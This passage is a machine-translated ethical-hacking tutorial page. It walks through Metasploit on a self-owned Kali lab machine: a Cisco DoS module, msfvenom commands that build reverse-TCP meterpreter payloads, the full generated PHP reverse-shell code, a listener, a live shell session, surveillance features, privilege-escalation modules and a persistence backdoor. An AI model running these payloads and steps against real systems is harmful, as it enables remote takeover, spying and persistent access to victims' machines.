auxiliary/dos/cisco/ios_http_percentpercent</strong></span><span id="5609" class="mt ls it mp b gy my mv l mw mx">msf5 auxiliary(dos/cisco/ios_http_percentpercent) &gt; <strong class="mp iu">set RHOSTS 127.0.0.1</strong><br/>RHOSTS =&gt; 127.0.0.1</span><span id="8cff" class="mt ls it mp b gy my mv l mw mx">msf5 auxiliary(dos/cisco/ios_http_percentpercent) &gt; <strong class="mp iu">exploit</strong><br/>[*] Running module against 127.0.0.1</span><span id="34be" class="mt ls it mp b gy my mv l mw mx">[-] 127.0.0.1:80 - Auxiliary failed: Rex::ConnectionRefused The connection was refused by the remote host (127.0.0.1:80).<br/>[-] 127.0.0.1:80 - Call stack:<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket/comm/local.rb:298:in `rescue in create_by_type'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket/comm/local.rb:263:in `create_by_type'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket/comm/local.rb:33:in `create'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:49:in `create_param'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket/tcp.rb:37:in `create_param'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket/tcp.rb:28:in `create'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/lib/msf/core/exploit/tcp.rb:106:in `connect'<br/>[-] 127.0.0.1:80 -   /usr/share/metasploit-framework/modules/auxiliary/dos/cisco/ios_http_percentpercent.rb:37:in `run'<br/>[*] Auxiliary module execution completed</span></pre><p id="5935" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可能想知道如何退出上下文。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="6fe1" class="mt ls it mp b gy mu mv l mw mx">msf5 auxiliary(dos/cisco/ios_http_percentpercent) &gt; <strong class="mp iu">back</strong><br/>msf5 &gt;</span></pre><h1 id="efb3" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">反向外壳客户端(“受害者”)</h1><p id="dc89" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">大多数带有防病毒软件的全补丁系统将检测和隔离反向外壳。我想这应该作为一个警告，以确保您的系统保持最新，并有病毒扫描软件，我会告诉你为什么。</p><p id="bcfe" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们将使用一个名为“<strong class="kw iu"> meterpreter </strong>”的漏洞。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="6151" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">search meterpreter</strong></span></pre><p id="3a45" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你会注意到Metasploit "<strong class="kw iu">meter preter</strong>"能够为许多平台创建反向shell，包括Avoid、Apple iOS、FreeBSD、Java、Linux、OSX、PHP、Python、Windows等等。</p><p id="2a11" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">仅举几个例子…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="9830" class="mt ls it mp b gy mu mv l mw mx">payload/python/meterpreter/reverse_tcp<br/>payload/android/meterpreter/reverse_tcp<br/>apple_ios/aarch64/meterpreter_reverse_tcp<br/>java/meterpreter/reverse_tcp<br/>linux/aarch64/meterpreter_reverse_tcp<br/>linux/armbe/meterpreter_reverse_tcp<br/>linux/mips64/meterpreter_reverse_tcp<br/>linux/mipsbe/meterpreter_reverse_tcp<br/>linux/mipsle/meterpreter/reverse_tcp<br/>linux/mipsle/meterpreter_reverse_tcp<br/>linux/ppc/meterpreter_reverse_tcp<br/>linux/ppc64le/meterpreter_reverse_tcp<br/>linux/ppce500v2/meterpreter_reverse_tcp<br/>linux/x64/meterpreter_reverse_tcp<br/>linux/x86/meterpreter_reverse_tcp<br/>linux/zarch/meterpreter_reverse_tcp<br/>osx/x64/meterpreter_reverse_tcp<br/>php/meterpreter_reverse_tcp<br/>python/meterpreter_reverse_tcp<br/>windows/meterpreter_reverse_tcp<br/>windows/x64/meterpreter_reverse_tcp</span></pre><p id="0d2d" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">毒液(<strong class="kw iu"> msfvenom </strong>)文档好像是用Windows做例子。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="ae69" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe</strong><br/>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br/>[-] No arch selected, selecting arch: x86 from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 341 bytes<br/>Final size of exe file: 73802 bytes<br/>Saved as: payload.exe</span></pre><p id="0324" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我没有Windows系统，所以我打算用Java来试试。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="f571" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f jar -o runme.jar</strong><br/>Payload size: 5307 bytes<br/>Final size of jar file: 5307 bytes<br/>Saved as: runme.jar</span></pre><p id="2c57" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">或者作为另一种选择，可能是PHP。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="47a0" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw -o runme.php</strong><br/>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br/>[-] No arch selected, selecting arch: php from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 1112 bytes<br/>Saved as: runme.php</span></pre><p id="3d38" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">PHP选项的好处在于，通过在文件上运行Linux“<strong class="kw iu">cat</strong>”，您可以实际看到它在漏洞中创建的代码。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="03ac" class="mt ls it mp b gy mu mv l mw mx">/*&lt;?php /**/ error_reporting(0); $ip = '192.168.1.2'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = <a class="ae lq" href="http://twitter.com/socket_connect" rel="noopener ugc nofollow" target="_blank">@socket_connect</a>($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();</span></pre><p id="fdaa" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">所以要明确的是，Windows (payload.exe)、Java (runme.jar)和PHP(runme.php)都非常不好运行。这是将在受害者设备上运行/安装的内容。</p><h1 id="ade8" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">反向外壳服务器(“攻击者”)</h1><p id="5cfd" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">下一步是配置并启动反向shell服务器。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="f921" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">use exploit/multi/handler</strong><br/>[*] Using configured payload generic/shell_reverse_tcp</span><span id="b340" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">set payload java/meterpreter/reverse_tcp</strong><br/>payload =&gt; java/meterpreter/reverse_tcp</span><span id="d722" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">show options</strong></span><span id="ec6c" class="mt ls it mp b gy my mv l mw mx">Module options (exploit/multi/handler):</span><span id="cc11" class="mt ls it mp b gy my mv l mw mx">Name  Current Setting  Required  Description<br/>   ----  ---------------  --------  -----------</span><span id="7073" class="mt ls it mp b gy my mv l mw mx">Payload options (java/meterpreter/reverse_tcp):</span><span id="027f" class="mt ls it mp b gy my mv l mw mx">Name   Current Setting  Required  Description<br/>   ----   ---------------  --------  -----------<br/>   LHOST                   yes       The listen address (an interface may be specified)<br/>   LPORT  4444             yes       The listen port</span><span id="5ca3" class="mt ls it mp b gy my mv l mw mx">Exploit target:</span><span id="94dc" class="mt ls it mp b gy my mv l mw mx">Id  Name<br/>   --  ----<br/>   0   Wildcard Target</span><span id="be1f" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">set LHOST 192.168.1.2</strong><br/>LHOST =&gt; 192.168.1.2</span><span id="ae36" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">set LPORT 4444</strong><br/>LPORT =&gt; 4444</span><span id="5595" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">show options</strong></span><span id="d1e9" class="mt ls it mp b gy my mv l mw mx">Module options (exploit/multi/handler):</span><span id="6506" class="mt ls it mp b gy my mv l mw mx">Name  Current Setting  Required  Description<br/>   ----  ---------------  --------  -----------</span><span id="0095" class="mt ls it mp b gy my mv l mw mx">Payload options (java/meterpreter/reverse_tcp):</span><span id="54b4" class="mt ls it mp b gy my mv l mw mx">Name   Current Setting  Required  Description<br/>   ----   ---------------  --------  -----------<br/>   LHOST  192.168.1.2      yes       The listen address (an interface may be specified)<br/>   LPORT  4444             yes       The listen port</span><span id="ab53" class="mt ls it mp b gy my mv l mw mx">Exploit target:</span><span id="3d95" class="mt ls it mp b gy my mv l mw mx">Id  Name<br/>   --  ----<br/>   0   Wildcard Target</span><span id="634e" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">exploit</strong></span><span id="dbe4" class="mt ls it mp b gy my mv l mw mx">[*] Started reverse TCP handler on 192.168.1.2:4444</span></pre><p id="edde" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">那么我们在这里做了什么…</p><ul class=""><li id="e1da" class="ne nf it kw b kx ky la lb ld ng lh nh ll ni lp nj nk nl nm bi translated">开始配置通用TCP反向外壳</li><li id="f955" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated">设置有效载荷<strong class="kw iu">Java/meter preter/reverse _ TCP</strong></li><li id="a6fc" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated">看了一下选项和我们需要设置的内容</li><li id="07f9" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated">设置LHOST和LPORT</li><li id="70b7" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated">已检查选项设置是否正确</li><li id="7861" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated">开始利用监听<strong class="kw iu"> 192.168.1.2:4444 </strong></li></ul><p id="222f" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">在另一个终端中，我可以看到Kali正在监听TCP 4444。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="4659" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">netstat -antup | grep :4444</strong><br/>(Not all processes could be identified, non-owned process info<br/> will not be shown, you would have to be root to see it all.)<br/>tcp        0      0 <strong class="mp iu">192.168.1.2:4444</strong>        0.0.0.0:*               LISTEN      63774/ruby</span></pre><p id="b71a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我在我的Kali主目录(<strong class="kw iu"> runme.jar </strong>)中发现了我的漏洞，给它执行权限并运行它。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="358c" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">chmod +x runme.jar </strong><br/>kali@kali:~$ <strong class="mp iu">./runme.jar</strong><br/>kali@kali:~$</span></pre><p id="90b3" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您应该希望看到"<strong class="kw iu"> runme.jar </strong>"正常运行，对吗？</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="e359" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">ps aux | grep runme</strong><br/>kali       63963  0.0  0.0   6112   644 pts/2    S+   22:54   0:00 grep --color=auto runme</span></pre><p id="938f" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">好像什么都没发生，对吗？还是做到了？</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="74df" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">lsof -i :4444</strong><br/>COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME<br/>ruby    63774 kali    8u  IPv4 170341      0t0  TCP 192.168.1.2:4444-&gt;192.168.1.2:56226 (ESTABLISHED)<br/>java    63940 kali    7u  IPv6 170614      0t0  TCP 192.168.1.2:56226-&gt;192.168.1.2:4444 (ESTABLISHED)</span></pre><p id="6124" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">让我们看看Metasploit控制台。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="8c20" class="mt ls it mp b gy mu mv l mw mx">[*] Started reverse TCP handler on 192.168.1.2:4444 <br/>[*] Sending stage (53944 bytes) to 192.168.1.2<br/><strong class="mp iu">[*] Meterpreter session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.2:56226) at 2020-10-15 22:53:28 +0100</strong></span><span id="4908" class="mt ls it mp b gy my mv l mw mx">meterpreter &gt;</span></pre><p id="991b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这是疯狂的部分…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="4da8" class="mt ls it mp b gy mu mv l mw mx">meterpreter &gt; <strong class="mp iu">shell</strong><br/>Process 1 created.<br/>Channel 1 created.</span><span id="fa09" class="mt ls it mp b gy my mv l mw mx"><strong class="mp iu">ls -la ~/runme.jar</strong><br/>-rwxr-xr-x 1 kali kali 5307 Oct 15 22:33 /home/kali/runme.jar</span></pre><p id="4f39" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">虽然我看不到提示，但我有一个返回到受害者系统的shell，并且能够找到“<strong class="kw iu"> runme.jar </strong>”文件。尝试创建一个文件或目录，您会看到它在受害者系统上创建。</p><p id="4fbc" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可以通过按Ctrl+C来终止shell。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="4a8a" class="mt ls it mp b gy mu mv l mw mx">Terminate channel 1? [y/N]  <strong class="mp iu">y</strong><br/>meterpreter &gt;</span></pre><p id="8868" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可以“<strong class="kw iu">后台</strong>”您的抄表员会话。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="9895" class="mt ls it mp b gy mu mv l mw mx">meterpreter &gt; <strong class="mp iu">background</strong></span></pre><p id="dddd" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可以显示当前会话，并按如下方式重新访问任何会话。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="ab9e" class="mt ls it mp b gy mu mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">show sessions</strong></span><span id="26f3" class="mt ls it mp b gy my mv l mw mx">Active sessions<br/>===============</span><span id="e9a6" class="mt ls it mp b gy my mv l mw mx">Id  Name  Type                    Information  Connection<br/>  --  ----  ----                    -----------  ----------<br/>  1         meterpreter java/linux  kali @ kali  192.168.1.2:4444 -&gt; 192.168.1.2:56226 (192.168.1.2)</span><span id="0451" class="mt ls it mp b gy my mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">sessions -i 1</strong><br/>[*] Starting interaction with 1...</span><span id="f4ef" class="mt ls it mp b gy my mv l mw mx">meterpreter &gt;</span></pre><p id="4af8" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我的意思是，它会让你彻夜难眠，因为你知道攻击者可以在你的系统上使用反向外壳做什么。访问您的网络摄像头、麦克风、查看您的桌面、截图、上传文件、播放音频文件等。所有真正不好的事情，所以这就是为什么它是如此重要，只开放软件，从值得信赖的来源，并确保您的系统是完全最新的，并有一个病毒扫描器。</p><p id="c478" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这里只是几个选项…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="232e" class="mt ls it mp b gy mu mv l mw mx">meterpreter &gt; <strong class="mp iu">help</strong></span><span id="9ed3" class="mt ls it mp b gy my mv l mw mx">Stdapi: Networking Commands<br/>===========================</span><span id="a6e7" class="mt ls it mp b gy my mv l mw mx">Command       Description<br/>    -------       -----------<br/>    ifconfig      Display interfaces<br/>    ipconfig      Display interfaces<br/>    portfwd       Forward a local port to a remote service<br/>    route         View and modify the routing table</span><span id="437e" class="mt ls it mp b gy my mv l mw mx">Stdapi: System Commands<br/>=======================</span><span id="cb5c" class="mt ls it mp b gy my mv l mw mx">Command       Description<br/>    -------       -----------<br/>    execute       Execute a command<br/>    getenv        Get one or more environment variable values<br/>    getuid        Get the user that the server is running as<br/>    localtime     Displays the target system's local date and time<br/>    pgrep         Filter processes by name<br/>    ps            List running processes<br/>    shell         Drop into a system command shell<br/>    sysinfo       Gets information about the remote system, such as OS</span><span id="6ac0" class="mt ls it mp b gy my mv l mw mx">Stdapi: User interface Commands<br/>===============================</span><span id="06ea" class="mt ls it mp b gy my mv l mw mx">Command       Description<br/>    -------       -----------<br/>    keyevent      Send key events<br/>    mouse         Send mouse events<br/>    screenshare   Watch the remote user's desktop in real time<br/>    screenshot    Grab a screenshot of the interactive desktop</span><span id="f25b" class="mt ls it mp b gy my mv l mw mx">Stdapi: Webcam Commands<br/>=======================</span><span id="b4d8" class="mt ls it mp b gy my mv l mw mx">Command       Description<br/>    -------       -----------<br/>    record_mic    Record audio from the default microphone for X seconds</span><span id="1432" class="mt ls it mp b gy my mv l mw mx">Stdapi: Audio Output Commands<br/>=============================</span><span id="f12e" class="mt ls it mp b gy my mv l mw mx">Command       Description<br/>    -------       -----------<br/>    play          play a waveform audio file (.wav) on the target system</span></pre><p id="6948" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">选项列表将取决于您正在访问的系统。我正在使用我的Kali Linux虚拟机，所以网络摄像头选项丢失了，但如果你正在访问一个Windows主机，例如，你会看到他们。</p><p id="300f" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">该漏洞将以运行它的用户的身份运行。为了完全访问机器，您需要提升您的权限。</p><p id="6e36" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">例如，如果您的目标是Windows，您有很多选择…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="43a2" class="mt ls it mp b gy mu mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">use post/windows/escalate/</strong><br/>use post/windows/escalate/droplnk             use post/windows/escalate/golden_ticket       use post/windows/escalate/screen_unlock       <br/>use post/windows/escalate/getsystem           use post/windows/escalate/ms10_073_kbdlayout  use post/windows/escalate/unmarshal_cmd_exec</span></pre><p id="75df" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你也可以随时要求受害者获得完全访问权？:S</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="ce3f" class="mt ls it mp b gy mu mv l mw mx">msf5 exploit(multi/handler) &gt; <strong class="mp iu">use exploit/windows/local/ask</strong></span></pre><p id="30e7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">对于基于Linux的系统来说，似乎没有那么多有趣的选项。如果目标是Windows用户，您可以在他们的系统上大展身手。</p><p id="736a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这些反向外壳并不持久。这意味着如果系统重新启动，它将不再运行，您将需要受害者再次运行它。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1c52" class="mt ls it mp b gy mu mv l mw mx">meterpreter &gt; <strong class="mp iu">run persistence -h</strong></span><span id="e0d0" class="mt ls it mp b gy my mv l mw mx">[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.<br/>[!] Example: run exploit/windows/local/persistence OPTION=value [...]<br/>Meterpreter Script for creating a persistent backdoor on a target host.</span><span id="669a" class="mt ls it mp b gy my mv l mw mx">OPTIONS:</span><span id="c830" class="mt ls it mp b gy my mv l mw mx">-A        Automatically start a matching exploit/multi/handler to connect to the agent<br/>    -L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.<br/>    -P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.<br/>    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)<br/>    -T &lt;opt&gt;  Alternate executable template to use<br/>    -U        Automatically start the agent when the User logs on<br/>    -X        Automatically start the agent when the system boots<br/>    -h        This help menu<br/>    -i &lt;opt&gt;  The interval in seconds between each connection attempt<br/>    -p &lt;opt&gt;  The port on which the system running Metasploit is listening<br/>    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back</span></pre><p id="cf4e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">根据Windows机器上的示例，要使反向shell持久化，您可以运行以下命令。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="9e0f" class="mt ls it mp b gy mu mv l mw mx">meterpreter &gt; <strong class="mp iu">run exploit/windows/local/persistence OPTION=X</strong></span></pre><p id="e8bb" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">为了进一步阅读，看看我写的关于这个话题的19个故事。</p><div class="ns nt gp gr nu"><div role="button" tabindex="0" class="ab bv gv cb fp nv nw bn nx ks ex"><div class="ny l"><div class="ab q"><div class="l di"><img alt="Michael Whittle" class="l de bw nz oa fe" src="../Images/f4d39d0c62b7f2e165491c1e2a8c6e26.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*efn30YXRNnd9uk7qbTOGnA.jpeg"/><div class="fb bw l nz oa fc n aw fd"/></div><div class="hh l fo"><p class="bd b dl z fp fq fr fs ft fu fv fw dk translated"><a class="ae af ag ah ai aj ak al am an ao ap aq ar as" href="https://whittle.medium.com/?source=post_page-----b768dac407a--------------------------------" rel="noopener follow" target="_top">迈克尔·惠特尔</a></p></div></div><div class="od oe gw l"><h2 class="bd iu tr ne fp ts fr fs tt fu fw is bi translated">道德黑客培训课程</h2></div><div class="ab q"><div class="l fo"><a class="bd b be z bi tu au tv tw tx qa ty an eh ei tz ua ub el em eo de bk ep" href="https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----b768dac407a--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="uc l fo"><span class="bd b dl z dk">19 stories</span></div></div></div><div class="oq dh or fp ab os fo di"><div class="di oi bv oj ok"><div class="dh l"><img alt="" class="dh" src="../Images/57c6829d9a7a0ff6d78e5d828845bb8c.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*UJZPySDP-tEonnesSAbLgA.png"/></div></div><div class="di oi bv ol om on"><div class="dh l"><img alt="" class="dh" src="../Images/e2d3aa85ee76ceb2b889dd753c231b67.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*rt1tdkIaxU8p69xo_yz9zg.jpeg"/></div></div><div class="di bv oo op on"><div class="dh l"><img alt="" class="dh" src="../Images/6240cd235d84e9cd8cb158d7147a71f5.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*78Op5N9xBfarPgmmwpHCQQ.jpeg"/></div></div></div></div></div><h1 id="5b44" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">迈克尔·惠特尔</h1><ul class=""><li id="5302" class="ne nf it kw b kx mj la mk ld ow lh ox ll oy lp nj nk nl nm bi translated"><strong class="kw iu"> <em class="nc">如果你喜欢这个，请</em> </strong> <a class="ae lq" href="https://whittle.medium.com/" rel="noopener"> <strong class="kw iu"> <em class="nc">跟我上媒</em> </strong> </a></li><li id="737a" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated"><strong class="kw iu"> <em class="nc">更多有趣的文章，请</em> </strong> <a class="ae lq" href="https://medium.com/trading-data-analysis" rel="noopener"> <strong class="kw iu"> <em class="nc">关注我的刊物</em> </strong> </a></li><li id="5d7b" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated"><strong class="kw iu"> <em class="nc">有兴趣合作吗？</em> </strong> <a class="ae lq" href="https://www.linkedin.com/in/miwhittle/" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu"> <em class="nc">让我们在LinkedIn上连线</em> </strong> </a></li><li id="e1a5" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated"><strong class="kw iu"> <em class="nc">支持我和其他媒体作者</em> </strong> <a class="ae lq" href="https://whittle.medium.com/membership" rel="noopener"> <strong class="kw iu"> <em class="nc">在此报名</em> </strong> </a></li><li id="872e" class="ne nf it kw b kx nn la no ld np lh nq ll nr lp nj nk nl nm bi translated"><strong class="kw iu"> <em class="nc">请别忘了为文章鼓掌:)←谢谢！</em>T47】</strong></li></ul></div></div>    
</body>
</html>